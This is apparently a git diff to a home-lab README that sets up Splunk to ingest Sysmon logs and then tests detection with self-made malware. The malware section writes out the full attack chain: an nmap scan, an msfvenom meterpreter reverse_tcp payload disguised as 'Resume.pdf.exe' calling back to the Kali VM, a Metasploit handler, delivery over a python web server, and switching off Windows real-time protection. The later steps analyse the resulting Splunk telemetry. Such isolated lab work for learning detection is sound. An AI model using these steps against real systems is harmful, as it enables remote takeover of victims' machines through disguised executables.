@@ -74,6 +74,8 @@ The objective of this project was to architect and deploy a robust, virtualized 
 11. [Scenario 2: Analyzing Malware Recommended Settings](#scenario-2-analyzing-malware-recommended-settings)
 12. [Network Configuration For Both VMs](#network-configuration-for-both-vms)
 13. [Installing Splunk On Windows 11 Pro VM](#installing-splunk-on-windows-11-pro-vm)
+14. [Configuring Splunk To Ingest Sysmon Logs](#configuring-splunk-to-ingest-sysmon-logs)
+15. [Creating and Using Malware To Test and Analyze Splunk and Sysmon Telemetry](#creating-and-using-malware-to-test-and-analyze-splunk-and-sysmon-telemetry)
 
 #### Installing VirtualBox
 Step 1: Head to https://www.virtualbox.org/wiki/Downloads and click download. 
@@ -415,8 +417,79 @@ Step 13: Lets check if Sysmon is in services by searching “Services”.
 Step 14: Back to Event Viewer… Now we can go on Sysmon > Operational and view a bunch of useful telematry!  
 <img width="975" height="725" alt="image" src="https://github.com/user-attachments/assets/09a0ec64-e310-47e5-9f75-19035057bc2e" />
 
+### Configuring Splunk To Ingest Sysmon Logs
+Step 1: Download the custom “inputs.conf” file at https://tinyurl.com/MyDFIR-Splunk-Inputs. This custom input configures splunk to ingest sysmon logs.  
+<img width="975" height="954" alt="image" src="https://github.com/user-attachments/assets/52d6ffe6-fdbb-4e99-a072-535cf98a7f3d" />
+
+Step 2: Lets place the “inputs.conf” file that we downloaded to the right place. Go to File Explorer > This PC > Local disk > program files > Splunk > etc > system > local       
+<img width="975" height="731" alt="image" src="https://github.com/user-attachments/assets/47f6b198-7d69-46c6-af8e-0c926925e7ab" />
+<img width="975" height="735" alt="image" src="https://github.com/user-attachments/assets/b0e11acf-0518-40d6-8d6d-5d801a873a79" />
+<img width="975" height="738" alt="image" src="https://github.com/user-attachments/assets/90bec017-82f4-4471-8169-18cb8187ddc5" />
+<img width="975" height="733" alt="image" src="https://github.com/user-attachments/assets/274c7569-46ff-4c0b-a8d6-f94b7c0a8f61" />
+<img width="975" height="731" alt="image" src="https://github.com/user-attachments/assets/210fec1b-8680-4103-b523-5f9ac976976b" />
+<img width="975" height="744" alt="image" src="https://github.com/user-attachments/assets/be1262f9-6e4a-44d2-ab1b-94ebdca4d6e6" />
+<img width="975" height="738" alt="image" src="https://github.com/user-attachments/assets/922d9fd1-ea2a-4886-904e-b2d995a75df9" />
 
 
+Step 3: Copy the “inputs.conf” file that we downloaded here.  
+<img width="975" height="742" alt="image" src="https://github.com/user-attachments/assets/5956e53b-49a3-46b8-a2c6-4ba2a5e7c89f" />
+
+Step 3.1: Restart Splunk Service. Search “Services” > Find “Splunkd Service” > Right click, Restart.   
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/92ef3c1f-f806-4e06-af53-d054adece5ac" />
+<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/2f8ed459-8f47-4dea-aa6f-c2289953063a" />
+
+Step 4: Create an index called “Endpoint” so our custom “inputs.conf” file works. Basically this transfers logs from sysmon/Operational to splunk index. Open up Splunk from the home page go on settings > New Index, Name = endpoint, save.    
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/5cc0b15a-502b-4d04-bc23-eed64e7a7c80" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/f91fde3b-1e90-4a3a-b824-5e8b874c2836" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/125dcf57-0c0a-4fca-b2fa-21a2e325752b" />
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/f8d38681-f73f-4bda-83c5-3dc96f9a84f9" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/b98bbf5b-9ad2-4bc5-9cc2-3b689fbec510" />
+<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/516bc234-85e1-456d-b174-97ceeec87713" />
+
+Step 5: Let’s verify if Splunk is ingesting Sysmon logs. Now go on App > search & reporting > search = “index=endpoint” press enter   
+<img width="975" height="808" alt="image" src="https://github.com/user-attachments/assets/6eddc4fb-cd19-4c77-9d81-9963afaa83f0" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/7f29f35c-e0ad-4579-9452-c46965a96b15" />
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/6678ed69-a2e1-4128-9feb-348a55e448d0" />
+<img width="975" height="802" alt="image" src="https://github.com/user-attachments/assets/b5dc408f-a9f0-4840-a10d-860ffaa3e769" />
+
+Step 6: Lets make sure that Sysmon parses automatically to splunk by downloading an app in Splunk. Go to App > Find More apps > Search = “Sysmon” > Install “Splunk Add-on for Sysmon. 
+<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/d63f94c2-b45a-4ed0-b815-7ea5e79bb6a1" />
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/40f7ac4a-c3b5-49aa-82bd-210111a8e3ed" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/24e23180-f7f3-40be-8b71-5175c320e7b5" />
+
+Step 7: This should add additional field when searching “index=endpoint”.  
+<img width="975" height="800" alt="image" src="https://github.com/user-attachments/assets/07cd3bee-5729-48e2-abe7-079a53dba63c" />
+
+#### Creating and Using Malware To Test and Analyze Splunk and Sysmon Telemetry
+Step 1: Make sure to use “Internal Network” Settings for Windows 11 Pro and Kali Linux VM.    
+Step 2: Verify Win11 Pro VM and Kali VM are on the same network and have the appropriate IP addressing.    
+Step 3: Keep both IP addresses in mind. Win11 = 192.168.20.10 & Kali = 192.168.20.11
+Step 4: Lets get started with NMAP by viewing the available commands. In the terminal do command “nmap -h”.  There are plenty of useful commands to use. For example “-A” will do a full scan aand adding a -Pn will skip pings.     
+Step 5: Lets do command “nmap -A 192.168.20.10 -Pn” to scan our Windows 11 VM and skipping ping to see what information we receive from the Win 11 VM.   
+Step 5: Lets create our malware using msfvenom. Do command “msfvenom + enter” in terminal.   
+Step 6: Lets see the available payloads we have by doing command “msfvenom -l payloads”. There will be plenty listed but we are using the “windows/x64/meterpreter/reverse_tcp” payload. Take note of  “windows/x64/meterpreter/reverse_tcp” since that is the one we will use. 
+Step 7: Lets start by building out our malware. Do command “msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe + enter”. This command will generate malware using reverse tcp payload which is instructed to connect back to our kali machine and port. The file format will be .exe and file name is Resume.pdf.exe.  
+Step 8: Type command “ls” to verify that the file was created and type command “file Resume.pdf.exe” to check what file it is.  
+Step 9: Now that we have our binary lets open up a handler that will listen in on the port that we have configured by using metasploit. Do command “msfconsole + enter” > “use exploit/multi/handler + enter”  
+Step 10: do command “options” to see what we can configure. Notice that the payload option is set to “generic/shell_reverse_tcp” we need to use the same payload we used when configuring our malware in msfvenom. 
+Step 11: lets change it. Do command “Set payload windows/x64/meterpreter/reverse_tcp + enter” then type command “options” again to verify the change.  
+Step 12: Lets configure “LHOST” to correspond to our attacker machine (Kali) by doing command “set lhost 192.168.20.11 + enter” then command “options” to verify change.  
+Step 13: Lets start this handler by doing command “exploit + enter”. Now we wait until the malware is executed in the Win 11 VM. 
+Step 14: We need to create a fast http server using python so we can import our malware to the Win 11 VM. Click on “Session, New Tab” to open up a new tab. Make sure we are in the same directory as our malware by doing command “ls”.   
+Step 15: Lets create the server. Do command “python3 -m http.server 9999 + enter”. After pressing enter the server is now live and hosting the malware file “Resume.pdf.exe”. 
+Step 16: Lets switch over to our Win 11 Pro VM. First we need to turn off real time detection on Windows Security. Again we created a simple malware. Our main goal is to test Splunk and Sysmon when malware is executed. Search “Windows Security” > Virus & Threat protection > Virus & Threat protection settings > manage settings > turn off “Real-time protection”.     
+Step 17: Let's go to the python server we created by opening up a browser > search = 192.168.20.11:9999 + enter”. The ip address is the kali machine on port 9999. Download “Resume.pdf.exe”.  
+Step 18: Let's execute the malware. Open “Resume.pdf.exe”  > click “Run” 
+Step 19: Lets return to the Splunk home page to see what useful telemetry we generated. Go to app > Search & Reporting > Search = “index=endpoint 192.168.20.11 + enter”. Lets first check what telemetry shows when we search up our kali machine ip of 192.168.20.11.    
+Step 20: Scroll down until you see “dest_port” then click on it  
+Step 21: This telematry tells us that ip 192.168.20.11 is attempting to reach port 4444. Port 4444 is commonly used by metasploit default payloads and other malware/command-and-control channels. For security context, if a machine is trying to reach port 4444 it may indicate an attempted reverse shell or remote exploitation attempt. Necessary actions to take next is to verify the source, check system for malware, set up firewall rules to block port 4444 if its not intended, and monitor network logs.
+Step 22: Lets look at more telemetry. But this time lets search the malware name that was executed by typing in “index=endpoint resume.pdf.exe + enter”.   
+Step 23: As you can see we have logged 303 events. Scroll down until you see “EventCode” then click on it.  
+Step 24: Lets focus on event code 1. 
+Step 25: We can see that event code 1 logged 30 events. Click on the latest event and expand it. Then scroll down and until you see “ProcessGuid”   
+Step 26: Copy and paste the “ProcessGuid” value into search bar so its “index=endpoint {ProcessGuidValue} + Enter” 
+Step 27: 5 events is logged. Lets clean up the search query by adding in |table _time,ParentImage,Image,CommandLine after the “ProcessGuid”. So its “index=endpoint {ProccessGuid} |table _time,ParentImage,Image,CommandLine + enter”.    
+Step 28: Lets analyze the ParentImage, Image, and CommandLine. Parent process “resume.pdf.exe” is suspicious because pdfs are never .exes. We can conclude that this is malware disguised as a pdf file. It was located in downloads which is common for malicious payloads. Child process “WerFault.exe” is a legitimate windows error reporting executable. However, it is suspicious because “resume.pdf.exe” spawned “WerFault.exe” which is not normal behavior. WerFault is usually triggered when covering up a crash it caused, run malicious code before or after a crash, and blending in with normal system process. Command line arguments “WerFault.exe -u -p 1052 -s 432” parameters are legitimate because Windows Error Reporting launches like this when a process crashes. In summary, malware “resume.pdf.exe” crashed, and WerFault was triggered to report it.
 
 
 
